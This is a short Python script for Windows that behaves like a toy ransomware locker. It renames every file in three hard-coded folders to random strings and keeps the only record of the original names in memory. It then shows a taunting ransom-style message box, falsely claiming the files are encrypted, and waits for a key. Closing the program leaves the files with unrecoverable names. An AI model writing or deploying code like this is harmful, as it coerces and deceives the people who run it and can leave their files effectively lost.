import os
import random
import win32api

VectorFiles = {}
DirectList = ["C:\\1",
			  "C:\\2",
			  "C:\\3"]

def MessageBoxEx(title, message):
    win32api.MessageBox(0, message, title)

def randomstring(leng):
	use = "1234567890qazw@!#$%^&()sxedcrfvtgbyhnujmikolpQAZWSXEEDCRFVTGBYHNUJMIKLOP"
	return "".join(random.sample(use, leng))

def encrypted(path):
	for f in os.listdir(path):
		file = os.path.join(path, f)
		if(os.path.isfile(file)):
			randomna = f"{path}\\{randomstring(random.randint(10,20))}"
			VectorFiles[file] = randomna
			os.rename(file,randomna)
		else: 
			encrypted(file)

def decrypt():
	for val, kay in VectorFiles.items():
		os.rename(kay,val)

def main():
	for dirz in DirectList:
		if(os.path.exists(dirz)):
			encrypted(dirz)
	MessageBoxEx("AHAHAHAHAAHAHHHAHAHA...",\
		"Your files have been encrypted.\n\
		If you close programs you will no \n\
		longer be able to restore files.\n\
		You should to type a true key\n\
		Goof Luck!")
	while(1):
		try:
			v = int(input("Key: "))
		except ValueError:
			continue
		if (v == 1):
			decrypt()
			break

if __name__ == '__main__':
	main()